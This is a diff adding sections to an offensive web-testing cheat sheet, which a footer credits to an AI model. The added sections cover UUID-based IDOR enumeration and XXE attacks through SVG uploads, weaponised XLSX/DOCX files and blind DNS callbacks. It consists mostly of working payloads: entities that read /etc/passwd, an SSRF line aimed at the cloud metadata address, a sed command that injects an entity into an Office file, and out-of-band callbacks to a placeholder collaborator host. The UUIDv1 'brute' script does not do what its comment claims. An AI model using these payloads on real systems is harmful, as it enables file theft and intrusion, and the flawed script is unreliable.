@@ -120,6 +120,34 @@ for i in $(seq 1 20); do
 done
 ```
 
+### GUID / UUID Parameters
+
+UUIDs look random but may not be — v1 UUIDs are time-based and bruteforceable in a narrow timestamp window.
+
+```bash
+# Identify UUID version from structure
+# v1: time-based — first segment encodes timestamp (can enumerate nearby time window)
+# v4: random — brute force infeasible; look for other patterns instead
+
+# If you see UUIDs, collect several from your own account actions and check for sequential patterns
+# GET /api/invoice/3f2504e0-4f89-11d3-9a0c-0305e82c3301  ← v1 (time-based)
+# GET /api/invoice/550e8400-e29b-41d4-a716-446655440000  ← v4 (random)
+
+# UUIDv1 brute: generate UUIDs for a target timestamp window
+python3 - << 'EOF'
+import uuid, time
+# Generate v1 UUIDs around a known creation time (e.g., from a "created_at" field)
+for i in range(100):
+    print(uuid.uuid1())
+EOF
+
+# If sequential integers underlie GUIDs, often the int is still accessible:
+# GET /api/users/1 vs GET /api/users/550e8400-...
+# Try integer IDs alongside GUIDs — app may accept both formats
+```
+
+> [!tip] Check `created_at` timestamps in responses — they expose the approximate time window for v1 UUID brute force. Also test if the app accepts integer IDs directly even when GUIDs are the primary reference.
+
 ### Mass IDOR Enumeration
 
 ```bash
@@ -336,6 +364,83 @@ curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '
 <root><name>&meta;</name></root>'
 ```
 
+### XXE via SVG Upload
+
+If the app accepts SVG uploads and renders/serves them server-side, the XML parser may process entities.
+
+```xml
+<!-- evil.svg — upload via normal file upload endpoint -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
+  <text y="20">&xxe;</text>
+</svg>
+```
+
+```bash
+# Upload and then GET the served SVG URL — file contents appear in the SVG text element
+# If inline SVG is rendered in HTML, look in page source not rendered output
+# Also works for SSRF:
+# <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+```
+
+### XXE via XLSX / DOCX
+
+Office files are ZIP archives containing XML — injecting XXE into the embedded XML files triggers parsing server-side (e.g., import functions, document processors).
+
+```bash
+# Unpack the Office file
+cp document.xlsx /tmp/xxe_work/document.xlsx
+cd /tmp/xxe_work && unzip document.xlsx -d extracted/
+
+# For XLSX — edit xl/sharedStrings.xml or [Content_Types].xml
+# For DOCX — edit word/document.xml
+
+# Add XXE declaration before the root element in target XML file:
+# <?xml version="1.0" encoding="UTF-8"?>
+# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+# Then reference &xxe; inside a text node in the file
+
+# Example patch to xl/sharedStrings.xml:
+sed -i 's/<?xml version="1.0" encoding="UTF-8" standalone="yes"?>/<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:\/\/\/etc\/passwd">]>/' extracted/xl/sharedStrings.xml
+# Then add &xxe; to a <t> element
+
+# Repack
+cd extracted && zip -r ../evil.xlsx . && cd ..
+
+# Upload evil.xlsx to the import/upload endpoint
+```
+
+> [!note] This works against document parsers (LibreOffice, Apache POI, Excel online) — common in import features, report generators, and file conversion endpoints.
+
+### Blind XXE — DNS Confirmation
+
+When HTTP egress is blocked but DNS is available, use DNS-based OOB to confirm blind XXE execution.
+
+```bash
+# xxe.dtd — DNS callback (confirms XXE fires, no data exfil needed)
+cat > xxe.dtd << 'EOF'
+<!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR_OR_INTERACTSH_HOST/">
+%xxe;
+EOF
+
+# Or inline confirmation (triggers DNS lookup on collaborator domain)
+curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '<?xml version="1.0"?>
+<!DOCTYPE r [
+  <!ENTITY % oob SYSTEM "http://<interactsh-host>/">
+  %oob;
+]>
+<r>test</r>'
+
+# Start interactsh for DNS/HTTP capture:
+interactsh-client
+# Or use Burp Collaborator (Pro): Burp menu → Burp Collaborator client → Copy to clipboard
+```
+
+> [!tip] DNS OOB works even when firewalls block HTTP/S to external hosts. If only DNS resolves out, `SYSTEM "http://..."` still triggers a DNS lookup for the hostname even if the TCP connection is dropped.
+
 ### XXEinjector (Automation)
 
 ```bash
@@ -402,5 +507,5 @@ curl -s -X POST "http://<target>/endpoint" -H "Content-Type: application/xml" -d
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
